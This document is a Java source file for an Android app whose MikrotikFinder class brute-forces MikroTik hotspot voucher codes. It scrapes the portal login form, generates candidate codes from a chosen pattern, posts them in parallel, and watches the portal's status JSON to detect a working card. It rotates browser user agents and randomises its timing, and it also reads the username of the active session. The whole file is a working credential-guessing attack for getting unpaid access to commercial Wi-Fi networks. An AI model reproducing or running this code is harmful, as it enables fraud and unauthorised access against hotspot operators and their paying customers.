package com.nexora.browser;

import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class MikrotikFinder {

    public interface Listener {
        void onProgress(long attempts, String currentCard);
        void onCardFound(String card, String details);
        void onError(String message);
        void onFinished(boolean found);
    }

    private static final String STATUS_PATH = "/status?var=callBack";
    private static final int FRESH_UPTIME_SECONDS = 15;

    private final String rawUrl, base, networkSlug, prefix, middle, suffix;
    private final int varDigits, maxAttempts, waitMs, parallel;
    private final boolean relax;
    private final GuessDatabase db;

    private final AtomicBoolean running = new AtomicBoolean(false);
    private final java.util.Set<String> triedInSession = java.util.Collections.synchronizedSet(new java.util.HashSet<>());
    private final AtomicLong totalAttempts = new AtomicLong(0);
    private final String allowedDigits;
    private final java.util.concurrent.atomic.AtomicLong counter = new java.util.concurrent.atomic.AtomicLong(0);
    private final java.util.concurrent.atomic.AtomicInteger recentErrors = new java.util.concurrent.atomic.AtomicInteger(0);
    private final java.util.List<String> candidates = java.util.Collections.synchronizedList(new java.util.ArrayList<>());
    private final java.util.Map<String, String> candidateDetails = new java.util.concurrent.ConcurrentHashMap<>();
    private volatile long firstCandidateTime = 0;
    private volatile String currentVoucher;
    private volatile String foundVoucher;
    private volatile Map<String, String> formTemplate = new HashMap<>();
    private volatile String lastStatusJson;
    private ExecutorService pool;
    private Listener listener;
    private final Handler uiHandler = new Handler(Looper.getMainLooper());
    private volatile boolean finishedOnce = false;

    public MikrotikFinder(String rawUrl, String networkName,
                          String prefix, String middle, String suffix,
                          int varDigits, int maxAttempts, int waitMs, int parallel,
                          boolean relax, GuessDatabase db,
                          String allowedDigits) {
        this.rawUrl = cleanUrl(convertArabicNumerals(rawUrl));
        String calcBase;
        try {
            URL u = new URL(this.rawUrl);
            calcBase = u.getProtocol() + "://" + u.getHost() + (u.getPort() > 0 ? ":" + u.getPort() : "");
        } catch (Exception e) {
            throw new IllegalArgumentException("رابط غير صالح: " + rawUrl);
        }
        this.base = calcBase;
        String slug = sanitize(networkName);
        if (slug.isEmpty()) {
            try { slug = sanitize(new URL(this.rawUrl).getHost()); } catch (Exception e) { slug = "default"; }
        }
        this.networkSlug = slug;
        this.prefix = prefix == null ? "" : prefix;
        this.middle = middle == null ? "" : middle;
        this.suffix = suffix == null ? "" : suffix;
        this.varDigits = Math.max(1, Math.min(12, varDigits));
        this.maxAttempts = Math.max(1, maxAttempts);
        this.waitMs = Math.max(50, waitMs);
        this.parallel = Math.max(1, Math.min(20, parallel));
        this.relax = relax;
        this.db = db;
        this.allowedDigits = (allowedDigits == null || allowedDigits.isEmpty()) ? "0123456789" : allowedDigits;
        // 🧠 منطق عدم التكرار الذكي
        try {
            String savedPrefix = db.getConfig("prefix");
            if (savedPrefix != null && !savedPrefix.isEmpty() && !savedPrefix.equals(this.prefix)) {
                Log.w("NEXORA", "البادئة تغيرت (" + savedPrefix + " → " + this.prefix + ") → تصفير كامل");
                db.clearAll();
            }
            db.saveConfig("prefix", this.prefix);
            db.saveConfig("suffix", this.suffix);
            db.saveConfig("digits", String.valueOf(this.varDigits));
        } catch (Exception e) {}
    }

    public void start(Listener l) {
        if (running.get()) return;
        this.listener = l;
        running.set(true);
        triedInSession.clear();
        finishedOnce = false;
        foundVoucher = null;
        lastStatusJson = null;
        pool = Executors.newFixedThreadPool(parallel + 1);
        pool.submit(this::bootstrap);
    }

    public void stop() { running.set(false); if (pool != null) pool.shutdownNow(); }
    public boolean isRunning() { return running.get(); }
    public String getNetworkSlug() { return networkSlug; }

    private void bootstrap() {
        try {
            emitProgress("قراءة صفحة الدخول...");
            WorkerSession probe = new WorkerSession();
            String loginHtml = httpGet(base + "/", probe, 8000);
            if (loginHtml == null) { fail("تعذّر الوصول لصفحة الدخول"); return; }
            Map<String, String> fields = extractFormFields(loginHtml);
            fields.put("username", "");
            fields.put("password", "");
            fields.put("popup", "true");
            fields.put("dst", base + "/");
            formTemplate = fields;
            Log.d("NEXORA", "form fields: " + fields.keySet());

            String initJson = httpGet(base + STATUS_PATH, probe, 5000);
            if (statusActive(initJson)) {
                String u = getStr(initJson, "username");
                if (u != null && !u.isEmpty() && !u.equals("-") && !u.equals("N/A")) {
                    lastStatusJson = initJson;
                    running.set(false);
                    if (listener != null) {
                        final String fv = u;
                        final String fj = initJson;
                        uiHandler.post(() -> listener.onCardFound(fv, fj));
                        uiHandler.post(() -> listener.onFinished(true));
                    }
                    return;
                }
            }

            emitProgress("بدء المحاولات...");
            for (int i = 0; i < parallel; i++) pool.submit(new Worker(i));
        } catch (Exception e) {
            fail("خطأ تجهيز: " + e.getMessage());
        }
    }

    private void fail(String msg) {
        running.set(false);
        if (listener != null) uiHandler.post(() -> listener.onError(msg));
    }

    private void emitProgress(final String line) {
        if (listener != null) uiHandler.post(() -> listener.onProgress(totalAttempts.get(), currentVoucher));
    }

    private class Worker implements Runnable {
        final WorkerSession session = new WorkerSession();
        Worker(int id) {}
        @Override public void run() {
            httpGet(base + "/", session, 5000);
            while (running.get() && foundVoucher == null) {
                if (db.countAttempts() >= maxAttempts) break;
                String voucher = generateVoucher();
                if (voucher == null) break;
                currentVoucher = voucher;
                emitProgress("");
                if (tryLogin(voucher, session)) {
                    foundVoucher = voucher;
                    final String v = voucher;
                    if (listener != null) uiHandler.post(() -> listener.onCardFound(v, lastStatusJson));
                    running.set(false);
                    break;
                }
                try {
                    long sleep = relax ? (600 + (long)(Math.random() * 800)) : (waitMs / 2 + (long)(Math.random() * waitMs));
                    // 🌐 تكييف مع الشبكة الضعيفة
                    int errs = recentErrors.get();
                    if (errs > 5) {
                        sleep *= 3; // بطيء جداً
                    } else if (errs > 2) {
                        sleep *= 2; // بطيء
                    }
                    Thread.sleep(sleep);
                } catch (InterruptedException e) { break; }
            }
            if (listener != null && !finishedOnce) {
                finishedOnce = true;
                final boolean f = foundVoucher != null;
                uiHandler.post(() -> listener.onFinished(f));
            }
        }
    }

    private boolean tryLogin(String voucher, WorkerSession session) {
        session.setCookie("username", voucher);
        session.setCookie("password", "");

        String beforeJson = httpGet(base + STATUS_PATH, session, 5000);
        long beforeUptime = parseUptime(getStr(beforeJson, "uptime"));
        boolean beforeActive = statusActive(beforeJson);

        String body = buildFormBody(formTemplate, voucher);
        String postResp = httpPost(base + "/login", body, session, 6000);
        totalAttempts.incrementAndGet();
        if (postResp == null) {
            recentErrors.incrementAndGet();
        } else {
            recentErrors.set(0);
        }

        // 🏷️ تصنيف الحالات
        if (postResp != null) {
            String lower = postResp.toLowerCase();
            String varPart = voucher;
            if (suffix != null && !suffix.isEmpty() && voucher.endsWith(suffix)) {
                varPart = voucher.substring(0, voucher.length() - suffix.length());
            }
            if (lower.contains("expired") || lower.contains("منتهي") || lower.contains("انتهت") ||
                lower.contains("expiry") || lower.contains("expire")) {
                db.addAttemptFull(voucher, varPart, "expired", null);
                return false;
            }
            if (lower.contains("invalid") || lower.contains("denied") ||
                lower.contains("not found") || lower.contains("غير صحيح")) {
                db.addAttemptFull(voucher, varPart, "error", null);
                return false;
            }
        }

        long[] checks = {150, 200, 250, 300, 400, 500, 700, 900};
        for (long d : checks) {
            try { Thread.sleep(d); } catch (InterruptedException e) { return false; }
            if (!running.get() || foundVoucher != null) return false;

            String afterJson = httpGet(base + STATUS_PATH, session, 4000);
            if (afterJson == null) continue;

            String user = getStr(afterJson, "username");
            long nowUptime = parseUptime(getStr(afterJson, "uptime"));
            boolean nowActive = statusActive(afterJson);

            boolean signal = false;
            if (user != null && !user.isEmpty() && !user.equals("-") && user.equals(voucher)) signal = true;
            
            if (nowActive && beforeUptime > 30 && nowUptime >= 0 && nowUptime <= FRESH_UPTIME_SECONDS) signal = true;
            if (nowActive && !beforeActive) signal = true;

            if (!signal) { emitProgress(""); continue; }

            String realUser = readRealUsername(session);
            if (realUser != null && !realUser.isEmpty() && !realUser.equals("-") && !realUser.equals("N/A")) {
                user = realUser;
            } else if (user == null || user.isEmpty() || user.equals("-")) {
                user = voucher;
            }

            lastStatusJson = afterJson;
            boolean isNew = false;
            synchronized (candidates) {
                if (!candidates.contains(user)) {
                    candidates.add(user);
                    candidateDetails.put(user, afterJson);
                    db.addFound(user, afterJson);
                    if (firstCandidateTime == 0) firstCandidateTime = System.currentTimeMillis();
                    isNew = true;
                }
            }
            if (isNew) {
                final String v = user;
                final String j = afterJson;
                if (listener != null) uiHandler.post(() -> listener.onCardFound(v, j));
            }
            currentVoucher = user;
            running.set(false);  // إيقاف فوري لكل العمال
            return true;
        }
        return false;
    }

    private String readRealUsername(WorkerSession s) {
        try {
            String[] urls = { base + "/status", base + "/", base + "/status?var=callBack" };
            for (String u : urls) {
                String html = httpGetHtml(u, s, 5000);
                if (html == null || html.isEmpty()) continue;
                String found = extractUsernameFromHtml(html);
                if (found != null && !found.isEmpty() && !found.equals("-") && !found.equals("N/A")) return found;
            }
        } catch (Exception e) {}
        return null;
    }

    private String extractUsernameFromHtml(String html) {
        if (html == null) return null;
        try {
            Matcher m1 = Pattern.compile("\"username\"\\s*:\\s*\"([^\"]+)\"").matcher(html);
            if (m1.find()) return m1.group(1);
            Matcher m2 = Pattern.compile("name=[\"']username[\"'][^>]*value=[\"']([^\"']+)[\"']").matcher(html);
            if (m2.find()) return m2.group(1);
            Matcher m3 = Pattern.compile("<td[^>]*>\\s*[Uu]sername\\s*</td>\\s*<td[^>]*>\\s*([^<\\s]+)").matcher(html);
            if (m3.find()) return m3.group(1);
            Matcher m4 = Pattern.compile("logged[ -]?in\\s+as\\s+[\"']?([A-Za-z0-9._-]+)").matcher(html);
            if (m4.find()) return m4.group(1);
        } catch (Exception e) {}
        return null;
    }

    private String httpGetHtml(String url, WorkerSession s, int timeout) {
        HttpURLConnection c = null;
        try {
            c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("GET");
            c.setConnectTimeout(timeout); c.setReadTimeout(timeout);
            c.setInstanceFollowRedirects(false);
            c.setRequestProperty("User-Agent", s.userAgent);
            c.setRequestProperty("Accept", "text/html,application/xhtml+xml,*/*");
            s.applyCookies(c);
            c.getResponseCode();
            s.captureCookies(c);
            return readBody(c);
        } catch (Exception e) { return null; } finally { if (c != null) c.disconnect(); }
    }

    private String httpGet(String url, WorkerSession s, int timeout) {
        HttpURLConnection c = null;
        try {
            c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("GET");
            c.setConnectTimeout(timeout); c.setReadTimeout(timeout);
            c.setInstanceFollowRedirects(false);
            c.setRequestProperty("User-Agent", s.userAgent);
            c.setRequestProperty("Accept", "*/*");
            s.applyCookies(c);
            c.getResponseCode();
            s.captureCookies(c);
            return readBody(c);
        } catch (Exception e) { return null; } finally { if (c != null) c.disconnect(); }
    }

    private String httpPost(String url, String body, WorkerSession s, int timeout) {
        HttpURLConnection c = null;
        try {
            c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("POST");
            c.setConnectTimeout(timeout); c.setReadTimeout(timeout);
            c.setInstanceFollowRedirects(false);
            c.setDoOutput(true);
            c.setRequestProperty("User-Agent", s.userAgent);
            c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            c.setRequestProperty("Referer", rawUrl);
            s.applyCookies(c);
            OutputStream os = c.getOutputStream();
            os.write(body.getBytes("UTF-8")); os.close();
            c.getResponseCode();
            s.captureCookies(c);
            return readBody(c);
        } catch (Exception e) { return null; } finally { if (c != null) c.disconnect(); }
    }

    private String readBody(HttpURLConnection c) {
        try {
            InputStream is = c.getResponseCode() >= 400 ? c.getErrorStream() : c.getInputStream();
            if (is == null) return null;
            BufferedReader br = new BufferedReader(new InputStreamReader(is, "UTF-8"));
            StringBuilder sb = new StringBuilder();
            String line; while ((line = br.readLine()) != null) { sb.append(line).append('\n'); if (sb.length() > 50000) break; }
            br.close();
            return sb.toString();
        } catch (Exception e) { return null; }
    }

    private String generateVoucher() {
        int base = allowedDigits.length();
        
        // 🎯 إذا كانت الأرقام مسموحة محدودة (مثل 12345)، عدّد منهجياً
        long total = 1;
        for (int i = 0; i < varDigits; i++) {
            total *= base;
            if (total > 100000000L) { total = 100000000L; break; }
        }
        
        // إذا كانت الأرقام المسموحة محدودة (أقل من 10) → تعداد منهجي كامل
        if (base < 10) {
            for (int attempt = 0; attempt < 300; attempt++) {
                long idx = counter.getAndIncrement();
                if (idx >= total) return null;
                
                char[] seq = new char[varDigits];
                long n = idx;
                for (int i = varDigits - 1; i >= 0; i--) {
                    seq[i] = allowedDigits.charAt((int)(n % base));
                    n /= base;
                }
                String seqStr = new String(seq);
                if (triedInSession.contains(seqStr)) continue;
                triedInSession.add(seqStr);
                String v = buildVoucherWithVar(seqStr);
                db.addAttemptWithStatus(v, "pending", null);
                return v;
            }
            return null;
        }
        
        // عشوائي من الأحرف المسموحة (جميع الأرقام 0-9)
        for (int attempt = 0; attempt < 500; attempt++) {
            StringBuilder sb = new StringBuilder();
            for (int j = 0; j < varDigits; j++) {
                sb.append(allowedDigits.charAt((int)(Math.random() * base)));
            }
            String seqStr = sb.toString();
            if (triedInSession.contains(seqStr)) continue;
            triedInSession.add(seqStr);
            String v = buildVoucherWithVar(seqStr);
            db.addAttemptWithStatus(v, "pending", null);
            return v;
        }
        return null;
    }

    // 🔧 منتصف الأرقام في المنتصف
    private String buildVoucherWithVar(String varStr) {
        if (varStr.length() != varDigits) varStr = pad(0, varDigits);
        int half1 = varDigits / 2;
        int half2 = varDigits - half1;
        String part1 = varStr.substring(0, half1);
        String part2 = varStr.substring(half1);
        return prefix + part1 + middle + part2 + suffix;
    }

    private String buildFormBody(Map<String, String> fields, String voucher) {
        StringBuilder sb = new StringBuilder();
        for (Map.Entry<String, String> e : fields.entrySet()) {
            if (sb.length() > 0) sb.append('&');
            String key = e.getKey();
            String val = "username".equals(key) ? voucher : e.getValue();
            sb.append(enc(key)).append('=').append(enc(val == null ? "" : val));
        }
        return sb.toString();
    }

    private String enc(String s) { try { return URLEncoder.encode(s, "UTF-8"); } catch (Exception e) { return s; } }

    private Map<String, String> extractFormFields(String html) {
        Map<String, String> m = new HashMap<>();
        if (html == null) return m;
        int fs = html.indexOf("<form"); if (fs < 0) return m;
        int fe = html.indexOf("</form>", fs); if (fe < 0) fe = html.length();
        String fh = html.substring(fs, fe);
        Matcher mt = Pattern.compile("<input[^>]*>", Pattern.CASE_INSENSITIVE).matcher(fh);
        while (mt.find()) {
            String tag = mt.group();
            String name = attr(tag, "name");
            if (name != null && !name.isEmpty()) m.put(name, attr(tag, "value") == null ? "" : attr(tag, "value"));
        }
        return m;
    }

    private String attr(String tag, String name) {
        Matcher m = Pattern.compile(name + "\\s*=\\s*[\"']([^\"']*)[\"']", Pattern.CASE_INSENSITIVE).matcher(tag);
        return m.find() ? m.group(1) : null;
    }

    private boolean statusActive(String json) {
        if (json == null) return false;
        try {
            JSONObject o = new JSONObject(json);
            String li = o.optString("logged_in", "").toLowerCase();
            if (!(li.equals("yes") || li.equals("true") || li.equals("1") || li.equals("on"))) return false;
            String ip = o.optString("ip", "").trim();
            String uptime = o.optString("uptime", "").trim();
            String user = o.optString("username", "").trim();
            if (!user.isEmpty() && !user.equals("-") && !user.equals("N/A")) return true;
            if (!ip.isEmpty() && !ip.equals("-") && !uptime.isEmpty() && !uptime.equals("-")) return true;
            return false;
        } catch (Exception e) { return false; }
    }

    private String getStr(String json, String f) {
        if (json == null) return null;
        try { return new JSONObject(json).optString(f, ""); } catch (Exception e) { return null; }
    }

    private long parseUptime(String s) {
        if (s == null || s.isEmpty()) return -1;
        try {
            Matcher m = Pattern.compile("(?:(\\d+)d)?(?:(\\d+)h)?(?:(\\d+)m)?(?:(\\d+)s)?").matcher(s.trim());
            if (!m.matches()) return -1;
            long d = m.group(1) != null ? Long.parseLong(m.group(1)) : 0;
            long h = m.group(2) != null ? Long.parseLong(m.group(2)) : 0;
            long mi = m.group(3) != null ? Long.parseLong(m.group(3)) : 0;
            long sec = m.group(4) != null ? Long.parseLong(m.group(4)) : 0;
            return d * 86400 + h * 3600 + mi * 60 + sec;
        } catch (Exception e) { return -1; }
    }

    private static String cleanUrl(String raw) {
        if (raw == null) raw = "";
        raw = raw.trim();
        if (raw.isEmpty()) raw = "http://7.7.7.7";
        if (!raw.toLowerCase().startsWith("http://") && !raw.toLowerCase().startsWith("https://")) raw = "http://" + raw;
        raw = raw.replaceAll("(?i)/ilogin", "/login");
        int h = raw.indexOf('#'); if (h >= 0) raw = raw.substring(0, h);
        int q = raw.indexOf('?'); if (q >= 0) raw = raw.substring(0, q);
        if (raw.endsWith("/")) raw = raw.substring(0, raw.length() - 1);
        return raw;
    }

    private static String convertArabicNumerals(String s) {
        if (s == null) return null;
        StringBuilder sb = new StringBuilder();
        for (char c : s.toCharArray()) {
            if (c >= '\u0660' && c <= '\u0669') sb.append((char)('0' + (c - '\u0660')));
            else sb.append(c);
        }
        return sb.toString();
    }

    private static String sanitize(String s) {
        if (s == null) return "";
        s = s.trim();
        if (s.isEmpty()) return "";
        s = s.replaceAll("[^A-Za-z0-9._-]", "_");
        s = s.replaceAll("[._-]{2,}", "_");
        return s.replaceAll("^[._-]+|[._-]+$", "");
    }

    private static String pad(long n, int digits) {
        StringBuilder sb = new StringBuilder(String.valueOf(n));
        while (sb.length() < digits) sb.insert(0, '0');
        return sb.toString();
    }

    static class WorkerSession {
        final Map<String, String> cookies = new HashMap<>();
        final String userAgent;
        private static final String[] UAS = {
            "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        };
        WorkerSession() { userAgent = UAS[(int)(Math.random() * UAS.length)]; }
        void setCookie(String k, String v) { cookies.put(k, v); }
        void applyCookies(HttpURLConnection c) {
            if (cookies.isEmpty()) return;
            StringBuilder sb = new StringBuilder();
            for (Map.Entry<String, String> e : cookies.entrySet()) {
                if (sb.length() > 0) sb.append("; ");
                sb.append(e.getKey()).append('=').append(e.getValue());
            }
            c.setRequestProperty("Cookie", sb.toString());
        }
        void captureCookies(HttpURLConnection c) {
            Map<String, List<String>> h = c.getHeaderFields();
            List<String> sc = h.get("Set-Cookie"); if (sc == null) sc = h.get("set-cookie");
            if (sc == null) return;
            for (String s : sc) {
                int semi = s.indexOf(';');
                String pair = semi >= 0 ? s.substring(0, semi) : s;
                int eq = pair.indexOf('=');
                if (eq > 0) cookies.put(pair.substring(0, eq).trim(), pair.substring(eq + 1).trim());
            }
        }
    }

    public java.util.List<String> getCandidates() { return new java.util.ArrayList<>(candidates); }
    public String getCandidateDetails(String card) { return candidateDetails.get(card); }

    public static String fetchCurrentVoucher(String baseUrl) {
        HttpURLConnection c = null;
        try {
            String b = baseUrl.replaceAll("(?i)/ilogin", "/login").replaceAll("[#?].*", "");
            if (b.endsWith("/")) b = b.substring(0, b.length()-1);
            WorkerSession s = new WorkerSession();
            c = (HttpURLConnection) new URL(b + "/").openConnection();
            c.setConnectTimeout(5000); c.setReadTimeout(5000);
            c.setRequestProperty("User-Agent", s.userAgent);
            s.applyCookies(c);
            c.getResponseCode();
            s.captureCookies(c);
            c.disconnect();
            c = (HttpURLConnection) new URL(b + "/status?var=callBack").openConnection();
            c.setConnectTimeout(5000); c.setReadTimeout(5000);
            c.setRequestProperty("User-Agent", s.userAgent);
            c.setRequestProperty("X-Requested-With", "XMLHttpRequest");
            s.applyCookies(c);
            int code = c.getResponseCode();
            if (code < 200 || code >= 300) { c.disconnect(); return null; }
            StringBuilder sb = new StringBuilder();
            BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream(), "UTF-8"));
            String line;
            while ((line = br.readLine()) != null) { sb.append(line); if (sb.length() > 20000) break; }
            br.close(); c.disconnect(); c = null;
            String json = sb.toString();
            try {
                JSONObject o = new JSONObject(json);
                String u = o.optString("username", "").trim();
                if (!u.isEmpty() && !u.equals("-") && !u.equals("N/A")) return u;
            } catch (Exception ignore) {}
            Matcher m = Pattern.compile("\"username\"\\s*:\\s*\"([^\"]+)\"").matcher(json);
            if (m.find()) return m.group(1);
            return null;
        } catch (Exception e) {
            return null;
        } finally { if (c != null) c.disconnect(); }
    }
}
